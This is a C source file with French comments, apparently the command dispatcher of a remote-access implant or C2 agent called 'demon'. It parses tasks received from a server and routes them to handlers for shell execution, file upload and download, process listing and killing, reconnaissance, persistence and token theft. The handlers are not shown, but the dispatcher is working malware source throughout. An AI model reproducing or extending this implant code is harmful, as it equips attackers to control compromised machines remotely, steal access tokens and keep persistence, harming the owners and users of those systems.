/*
 * dispatcher.c - Implémentation du dispatcher de commandes
 */

#include "dispatcher.h"
#include "../core/config.h"
#include "../core/demon.h"
#include "../utils/memory.h"
#include "../utils/strings.h"
#include "handlers/file.h"
#include "handlers/persist.h"
#include "handlers/process.h"
#include "handlers/recon.h"
#include "handlers/shell.h"
#include "handlers/token.h"

/* ============================================================================
 * Parser JSON minimal
 *
 * Note: C'est un parser très basique, juste assez pour nos besoins.
 * Dans un vrai projet on utiliserait une lib JSON.
 * ============================================================================
 */

/*
 * Trouve la valeur d'une clé dans un objet JSON simple.
 * Retourne un pointeur vers le début de la valeur (sans les quotes si string).
 */
static const char *json_find_value(const char *json, const char *key,
                                   size_t *value_len) {
  if (!json || !key)
    return NULL;

  char search_key[128];
  snprintf(search_key, sizeof(search_key), "\"%s\":", key);

  const char *found = strstr(json, search_key);
  if (!found)
    return NULL;

  /* Avance après le : */
  found += strlen(search_key);

  /* Skip les whitespaces */
  while (*found == ' ' || *found == '\t' || *found == '\n')
    found++;

  /* Détermine le type de valeur */
  if (*found == '"') {
    /* C'est une string */
    found++;
    const char *end = strchr(found, '"');
    if (!end)
      return NULL;
    *value_len = end - found;
    return found;
  } else if (*found == '{' || *found == '[') {
    /* Objet ou array - pas supporté pour l'instant */
    *value_len = 0;
    return NULL;
  } else {
    /* Nombre ou bool */
    const char *end = found;
    while (*end && *end != ',' && *end != '}' && *end != ' ' && *end != '\n') {
      end++;
    }
    *value_len = end - found;
    return found;
  }
}

/*
 * Extrait une string d'un JSON.
 * Le résultat doit être libéré par l'appelant.
 */
static char *json_get_string(const char *json, const char *key) {
  size_t len = 0;
  const char *value = json_find_value(json, key, &len);
  if (!value || len == 0)
    return NULL;

  char *result = (char *)malloc(len + 1);
  if (!result)
    return NULL;

  memcpy(result, value, len);
  result[len] = '\0';

  return result;
}

/*
 * Extrait un int d'un JSON.
 */
static int json_get_int(const char *json, const char *key) {
  size_t len = 0;
  const char *value = json_find_value(json, key, &len);
  if (!value || len == 0)
    return 0;

  return str_to_int(value);
}

/*
 * Convertit un string de commande en enum.
 */
static command_type_t string_to_command(const char *cmd) {
  if (!cmd)
    return CMD_NONE;

  if (str_icmp(cmd, "shell") == 0)
    return CMD_SHELL;
  if (str_icmp(cmd, "pwd") == 0)
    return CMD_PWD;
  if (str_icmp(cmd, "cd") == 0)
    return CMD_CD;
  if (str_icmp(cmd, "ls") == 0)
    return CMD_LS;
  if (str_icmp(cmd, "dir") == 0)
    return CMD_LS;
  if (str_icmp(cmd, "download") == 0)
    return CMD_DOWNLOAD;
  if (str_icmp(cmd, "upload") == 0)
    return CMD_UPLOAD;
  if (str_icmp(cmd, "ps") == 0)
    return CMD_PS;
  if (str_icmp(cmd, "kill") == 0)
    return CMD_KILL;
  if (str_icmp(cmd, "whoami") == 0)
    return CMD_WHOAMI;
  if (str_icmp(cmd, "sysinfo") == 0)
    return CMD_SYSINFO;
  if (str_icmp(cmd, "sleep") == 0)
    return CMD_SLEEP;
  if (str_icmp(cmd, "exit") == 0)
    return CMD_EXIT;
  if (str_icmp(cmd, "persist") == 0)
    return CMD_PERSIST;
  if (str_icmp(cmd, "token_list") == 0)
    return CMD_TOKEN_LIST;
  if (str_icmp(cmd, "token_steal") == 0)
    return CMD_TOKEN_STEAL;

  return CMD_NONE;
}

/* ============================================================================
 * Implémentation
 * ============================================================================
 */

int dispatcher_init(void) {
  /* Pour l'instant rien à initialiser */
  return STATUS_SUCCESS;
}

int dispatcher_parse_tasks(const char *json_data, size_t data_len,
                           task_t **tasks, int *task_count) {
  if (!json_data || !tasks || !task_count) {
    return STATUS_FAILURE;
  }

  *tasks = NULL;
  *task_count = 0;

  UNUSED(data_len);

  /*
   * Format attendu:
   * {
   *   "tasks": [
   *     {"task_id": "xxx", "command": "shell", "args": "whoami"},
   *     ...
   *   ]
   * }
   *
   * Ou format simple pour une seule tâche:
   * {"task_id": "xxx", "command": "shell", "args": "whoami"}
   */

  /* Check si c'est une réponse vide */
  if (strstr(json_data, "\"tasks\":[]") || strstr(json_data, "\"tasks\": []")) {
    return STATUS_SUCCESS; /* Pas de tâches */
  }

  /* Parse une seule tâche pour l'instant */
  char *task_id = json_get_string(json_data, "task_id");
  char *command = json_get_string(json_data, "command");
  char *args = json_get_string(json_data, "args");

  if (!task_id || !command) {
    if (task_id)
      free(task_id);
    if (command)
      free(command);
    if (args)
      free(args);
    return STATUS_SUCCESS; /* Pas de tâche valide */
  }

  /* Alloue une tâche */
  task_t *task = (task_t *)secure_alloc(sizeof(task_t));
  if (!task) {
    free(task_id);
    free(command);
    if (args)
      free(args);
    return STATUS_NO_MEMORY;
  }

  strncpy(task->task_id, task_id, sizeof(task->task_id) - 1);
  task->command = string_to_command(command);
  task->args = args;
  task->args_len = args ? strlen(args) : 0;
  task->data = NULL;
  task->data_len = 0;

  free(task_id);
  free(command);

  *tasks = task;
  *task_count = 1;

  return STATUS_SUCCESS;
}

int dispatcher_execute(task_t *task, task_result_t *result) {
  if (!task || !result) {
    return STATUS_FAILURE;
  }

  memset(result, 0, sizeof(task_result_t));
  strncpy(result->task_id, task->task_id, sizeof(result->task_id) - 1);

  int status = STATUS_SUCCESS;

  switch (task->command) {
  case CMD_SHELL:
    status =
        handler_shell_exec(task->args, &result->output, &result->output_len);
    break;

  case CMD_PWD:
    status = handler_file_pwd(&result->output, &result->output_len);
    break;

  case CMD_CD:
    status = handler_file_cd(task->args, &result->output, &result->output_len);
    break;

  case CMD_LS:
    status = handler_file_ls(task->args, &result->output, &result->output_len);
    break;

  case CMD_DOWNLOAD:
    status =
        handler_file_download(task->args, &result->data, &result->data_len);
    if (status == STATUS_SUCCESS) {
      result->output = str_dup("File downloaded successfully");
      result->output_len = result->output ? strlen(result->output) : 0;
    }
    break;

  case CMD_UPLOAD:
    /* L'upload nécessite les données dans task->data */
    status = handler_file_upload(task->args, task->data, task->data_len);
    result->output = str_dup(status == STATUS_SUCCESS ? "Upload successful"
                                                      : "Upload failed");
    result->output_len = result->output ? strlen(result->output) : 0;
    break;

  case CMD_PS:
    status = handler_process_list(&result->output, &result->output_len);
    break;

  case CMD_KILL:
    status = handler_process_kill(str_to_int(task->args));
    result->output = str_dup(
        status == STATUS_SUCCESS ? "Process killed" : "Failed to kill process");
    result->output_len = result->output ? strlen(result->output) : 0;
    break;

  case CMD_WHOAMI:
    status = handler_recon_whoami(&result->output, &result->output_len);
    break;

  case CMD_SYSINFO:
    status = handler_recon_sysinfo(&result->output, &result->output_len);
    break;

  case CMD_SLEEP: {
    DWORD new_sleep =
        (DWORD)str_to_int(task->args) * 1000; /* Convertit en ms */
    /* Applique le nouveau sleep time via la config globale */
    config_set_sleep(&g_demon.config, new_sleep);
    char msg[64];
    snprintf(msg, sizeof(msg), "Sleep time updated to %lu seconds",
             (unsigned long)(new_sleep / 1000));
    result->output = str_dup(msg);
    result->output_len = result->output ? strlen(result->output) : 0;
  } break;

  case CMD_EXIT:
    /* Signale au demon de s'arrêter */
    result->output = str_dup("Exiting...");
    result->output_len = result->output ? strlen(result->output) : 0;
    /* Le flag running sera mis à false par le demon */
    break;

  case CMD_PERSIST:
    status = handler_persist_add(task->args);
    result->output =
        str_dup(status == STATUS_SUCCESS ? "Persistence added"
                                         : "Failed to add persistence");
    result->output_len = result->output ? strlen(result->output) : 0;
    break;

  case CMD_TOKEN_LIST:
    status = handler_token_list(&result->output, &result->output_len);
    break;

  case CMD_TOKEN_STEAL:
    status = handler_token_steal(str_to_int(task->args));
    result->output = str_dup(
        status == STATUS_SUCCESS ? "Token stolen" : "Failed to steal token");
    result->output_len = result->output ? strlen(result->output) : 0;
    break;

  default:
    result->output = str_dup("Unknown command");
    result->output_len = result->output ? strlen(result->output) : 0;
    status = STATUS_TASK_ERROR;
    break;
  }

  result->status = status;

  return status;
}

void dispatcher_cleanup(void) { /* Rien à cleanup pour l'instant */ }
